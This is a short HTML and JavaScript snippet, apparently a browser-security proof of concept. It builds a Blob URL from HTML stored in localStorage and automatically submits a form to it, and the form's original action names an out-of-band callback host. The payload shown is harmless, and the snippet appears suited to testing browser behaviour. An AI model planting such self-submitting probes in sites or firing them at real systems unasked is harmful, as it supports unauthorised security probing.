<form id="f" action="blob:https://nyyxpcnshozjjfkvzprg36rjke8g5wbfa.oast.fun" method="GET" target="_self">

<script>
// HTML content to be stored in localStorage (if not already stored)
var htmlContent = `
  <html>
    <body>
      <h1>Blob HTML Content</h1>
      <p>This content is persisted even after page reload.</p>
    </body>
  </html>
`;

// Check if the content is already stored in localStorage
if (!localStorage.getItem('htmlContent')) {
  // If it's not stored, save it in localStorage
  localStorage.setItem('htmlContent', htmlContent);
}

// Retrieve the content from localStorage
var storedContent = localStorage.getItem('htmlContent');

// Create a Blob from the stored HTML content
var blob = new Blob([storedContent], { type: 'text/html' });

// Generate the Blob URL
var blobURL = URL.createObjectURL(blob);

// Set the form's action to the Blob URL
var form = document.getElementById('f');
form.action = blobURL;

// Automatically submit the form
setTimeout(function() {
  form.submit();
}, 100); // Delay to ensure the Blob URL is ready
</script>
